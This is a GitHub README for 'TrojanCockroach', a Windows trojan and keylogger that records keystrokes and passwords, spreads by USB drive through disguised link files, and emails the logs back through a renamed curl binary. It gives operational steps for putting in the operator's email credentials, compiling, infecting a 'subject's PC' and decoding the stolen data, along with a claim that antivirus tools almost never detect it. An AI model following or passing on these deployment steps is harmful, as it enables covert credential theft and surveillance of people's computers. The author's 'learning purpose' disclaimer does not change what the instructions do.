
<a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is a **Trojan Virus** that steals data (ID, password; every key stroke) from PC (Windows XP or later) and emails it back to the host. It spreads among PCs through USB drives. It is almost undetectable to any antivirus software.

*This project is created only for learning purpose.*

### Intro
- [TrojanCockroach.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.cpp)- logs user's data, sends data through Transmit.exe, infects portable drive.
- [Infect.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.cpp)- installs the virus into computer from portable drive.
- [Transmit.exe](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Transmit.exe)-  emails data back.
- [TrojanCockroach.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.lnk)- resides in the startup folder of PC and activates TrojanCockroach.exe
- [Infect.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
- [DecodeMessage.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/DecodeMessage.cpp)- used to decode received email.

### Setup
#### Preparation 
  
  1. Download the full package from [here](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach).
  
  2. Change the method **sendData()** of TrojanCockroach.cpp- place your email and password in the command.
   ![change email address](https://cloud.githubusercontent.com/assets/5456665/21505255/c5c3db2e-cc8f-11e6-834f-1312e566a7ed.png)
    
  3. Compile **TrojanCockroach.cpp** & **Infect.cpp**. **Transmit.exe** is actually the executable distribution of [curl](https://curl.haxx.se) for Windows.
  
  4. Place **TrojanCockroach.exe**, **Infect.exe**, **Transmit.exe**, **Infect.lnk** & **TrojanCockroach.lnk** in the same folder. This is how they look-
   
   ![Trojan Cockroach full package](https://cloud.githubusercontent.com/assets/5456665/21505256/c5c4a982-cc8f-11e6-9b12-147fa7630e0f.png)

  5. Now run **TrojanCockroach.exe** then insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Infect.lnk.
   
   ![Trojan Cockroach infected pendrive](https://cloud.githubusercontent.com/assets/5456665/21505254/c5c0394c-cc8f-11e6-99be-16175b741c2a.PNG)
    
### Attack 
  
  1. Insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!). Run Infect.lnk and the spyware will be injected.
  
  2. The syware will be activated after a reboot. Now (after a restart) every time any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the cycle will start again.

#### Data Collection 
  
  1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
  
  2. After getting the email copy the full message to a text file.
   
   ![Trojan Cockroach infected pendrive](https://cloud.githubusercontent.com/assets/5456665/21505503/2687fcd6-cc92-11e6-8bad-885fc9f77a78.PNG)
   
   As the message has come through email certain characters are converted. To resolve that --- --- ---.
  
  3. Now, run **DecodeMessage.exe** for decoding the message as plain text.
   
   ![Trojan Cockroach infected pendrive](https://cloud.githubusercontent.com/assets/5456665/21505528/59e92b0e-cc92-11e6-90bf-a050ed920ee9.png)
   
   In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming). 

### Further 
You may read [TrojanCockroachStory](https://github.com/MinhasKamal/TrojanCockroach/blob/master/TrojanCockroachStory.md) to get an overview of how the program works. You will get a clearer understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/MinhasKamal/StupidKeyLogger)**.

The project is perfectly runnable. But I do not want newbies to abuse my project, so I am **keeping some simple secrets unrevealed**. There are also some intentionally created **holes in this 'README'**. I have made some **nonsense changes in the code** too, so that no one can run it effectively without getting his hands dirty. I believe these plain obstacles can easily be overcome by ***ACTUAL PROGRAMMERS***.

**Note:** *I will not also take any responsibility of someone else's ill act with my program.* But I do believe that a real learner will learn a lot from this.


### License
![MIT License](https://cloud.githubusercontent.com/assets/5456665/21516533/4dbcf646-cd03-11e6-9d97-de3acf6c42ae.png)

[Trojan Cockroach](https://github.com/MinhasKamal/TrojanCockroach) is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
